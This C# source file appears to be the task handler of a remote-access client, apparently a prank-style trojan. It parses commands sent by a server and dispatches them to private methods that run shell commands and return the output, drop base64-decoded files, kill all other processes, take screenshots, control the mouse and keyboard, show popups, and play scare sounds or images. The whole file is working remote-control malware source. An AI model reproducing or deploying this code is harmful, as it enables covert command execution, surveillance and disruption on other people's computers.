using CommandSpace;
using MouseManipulator;
using ResponseBuilderSpace;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;
using ToolsSpace;
using NamesSpace;
using System.Speech.Synthesis;
using System.Media;

namespace TasksSpace {

    public class Tasks {

        private readonly ResponseBuilder ResponseBuilder;
        private readonly string tasks;
        private Random random = new Random();

        public Tasks(string tasks, ResponseBuilder responseBuilder) {
            this.ResponseBuilder = responseBuilder;
            this.tasks = tasks;
        }

        public void Invoke() {
            if (this.tasks.Length == 0) return;

            string tasks = this.tasks.Substring(1, this.tasks.Length - 3);
            string[] requests = tasks.Split(new string[] { "],[" }, StringSplitOptions.RemoveEmptyEntries);

            foreach (string request in requests) {
                string command = request.Split(new string[] { Client.SEPERATOR }, StringSplitOptions.None)[0];
                string parameter = request.Split(new string[] { Client.SEPERATOR }, StringSplitOptions.None)[1];

                try {
                    this.GetType().GetMethod(command, BindingFlags.NonPublic | BindingFlags.Instance).Invoke(this, new object[] { parameter });
                } catch (Exception e) {
                    Console.WriteLine(e.ToString());
                }
            }
        }

        private void run(string s) {
            string output = new Command(s).Run();
            ResponseBuilder.msg(output.Replace(Environment.NewLine, Client.LINE_SEPERATOR));
        }

        private void copyfile(string s) {
            string name = s.Split(new char[] { ',' }, 2)[0];
            string data = s.Split(new char[] { ',' }, 2)[1];
            byte[] bytes = Tools.DecodeFromBase64(data);
            File.WriteAllBytes(name, bytes);
        }

        private void stop(string s) {
            if (Boolean.Parse(s)) {
                foreach (Process process in Process.GetProcessesByName(Names.STARTER)) {
                    process.Kill();
                }
                foreach (Process process in Process.GetProcessesByName(Names.CLIENT)) {
                    if (process.Id != Process.GetCurrentProcess().Id) {
                        process.Kill();
                    }
                }
                Process.GetCurrentProcess().Kill();
            }
        }

        private void killtasks(string s) {
            if (Boolean.Parse(s)) {
                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes) {
                    if (!process.ProcessName.Equals(Names.CLIENT) && !process.ProcessName.Equals(Names.STARTER)) {
                        try {
                            process.Kill();
                        } catch (Exception e) {
                            Console.WriteLine(e.GetType());
                        }
                    }
                }
            }
        }

        private void image(string s) {
            new Thread(() => {
                if (s.Equals("unicorn")) {
                    Form f = new Form();
                    Color color = Color.White;
                    f.BackColor = color;
                    f.TransparencyKey = color;
                    f.FormBorderStyle = FormBorderStyle.None;
                    f.Bounds = Screen.PrimaryScreen.Bounds;
                    f.TopMost = true;

                    Image image = Image.FromFile("res/unicorn.png");
                    f.Paint += (o, e) => {
                        Graphics g = f.CreateGraphics();
                        g.DrawImage(image, new Point(250, 75));
                    };

                    new Thread(() => Application.Run(f)).Start();
                    Thread.Sleep(5000);
                    Application.Exit();
                }
            }).Start();
        }

        private void msgbox(string s) {
            new Thread(() => MessageBox.Show(s, "INFO", MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, (MessageBoxOptions)4096)).Start();
        }

        private void screenshot(string s) {
            ResponseBuilder.screenshot();
        }

        private void blockinputs(string s) {

        }

        private void skulllaughter(string s) {
            if (Boolean.Parse(s)) {
                Console.WriteLine("res/laughing" + random.Next(2) + 1 + ".wav");
                SoundPlayer sound = new SoundPlayer("res/laughing" + (random.Next(2)+1) + ".wav");
                sound.Play();
            }
        }

        private void pcusage(string s) {
            ResponseBuilder.msg(HardwareUsage.Hardware.Monitor());
        }

        private void mousepos(string s) {
            string[] coords = s.Split(',');
            float xPercentage = float.Parse(coords[0]) / 100f;
            float yPercentage = float.Parse(coords[1]) / 100f;
            Cursor.Position = new Point((int)(Screen.PrimaryScreen.Bounds.Width * xPercentage), (int)(Screen.PrimaryScreen.Bounds.Height * yPercentage));
        }

        private void pressmouse(string s) {
            int button = Convert.ToInt32(s);
            if (button == 0) {
                VirtualMouse.LeftDown();
            } else if (button == 2) {
                VirtualMouse.RightDown();
            }
        }

        private void say(string s) {
            new Thread(() => {
                SpeechSynthesizer tts = new SpeechSynthesizer();
                tts.SetOutputToDefaultAudioDevice();
                tts.Speak(s);
                tts.Dispose();
            }).Start();
        }

        private void releasemouse(string s) {
            int button = Convert.ToInt32(s);
            if (button == 0) {
                VirtualMouse.LeftUp();
            } else if (button == 2) {
                VirtualMouse.RightUp();
            }
        }

        private void clickmouse(string s) {
            string[] args = s.Split(',');
            int button = Convert.ToInt32(args[0]);
            float x = float.Parse(args[1]) / 100f;
            float y = float.Parse(args[2]) / 100f;

            Cursor.Position = new Point((int)(Screen.PrimaryScreen.Bounds.Width * x), (int)(Screen.PrimaryScreen.Bounds.Height * y));

            if (button == 0) {
                VirtualMouse.LeftClick();
            } else if (button == 2) {
                VirtualMouse.RightClick();
            }
        }

        private void keys(string s) {
            try {
                SendKeys.SendWait(s);
            } catch (Exception e) {

            }
        }

    }

}
